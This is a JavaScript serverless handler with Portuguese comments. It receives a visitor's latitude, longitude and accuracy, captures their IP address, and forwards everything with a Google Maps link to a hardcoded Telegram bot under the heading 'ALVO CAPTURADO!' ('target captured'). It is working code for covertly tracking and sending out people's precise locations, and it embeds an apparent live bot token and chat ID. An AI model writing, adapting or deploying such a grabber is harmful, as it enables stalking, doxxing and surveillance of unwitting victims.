export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const { lat, lon, precisao } = req.body;
            
            const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconhecido';

            const mensagem = `🚨 ALVO CAPTURADO!\n\n🌐 IP: ${ipCliente}\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Precisão: ${precisao}m\n\n🗺️ Abrir no Maps: https://www.google.com/maps?q=${lat},${lon}`;

            // SEUS DADOS DO TELEGRAM AQUI:
            const tokenBot = "8772002391:AAHnAQNqA6rwWNC79NXdn8m4e_uOPxyjuLk";
            const chatId = "8568978632";

            await fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(mensagem));

            return res.status(200).json({ status: 'Sucesso' });
        } catch (err) {
            console.error("Erro:", err);
            return res.status(500).json({ error: 'Erro interno' });
        }
    } else {
        return res.status(405).json({ error: 'Método não permitido' });
    }
}
